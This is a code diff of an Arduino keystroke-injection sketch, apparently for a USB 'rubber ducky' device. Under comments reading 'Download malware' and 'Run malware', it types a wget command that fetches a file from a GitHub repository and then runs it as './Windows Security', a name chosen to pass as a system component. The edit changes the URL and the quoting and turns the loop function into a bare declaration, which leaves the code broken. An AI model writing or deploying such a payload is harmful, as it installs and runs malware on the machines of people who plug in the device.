@@ -23,7 +23,7 @@ void setup() {
   delay(1000);
   
   // Download malware
-  Keyboard.print("wget https://www.github.com/The-TT-Hacker/usb-rubber-ducky/Windows Security");
+  Keyboard.print("wget https://www.github.com/The-TT-Hacker/usb-rubber-ducky");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
@@ -32,12 +32,7 @@ void setup() {
 
   // Run malware
 
-  Keyboard.print("./Windows Security");
-
-
+  Keyboard.print("./'Windows Security'");
 }
 
-void loop() {
-  // put your main code here, to run repeatedly:
-
-}
+void loop();
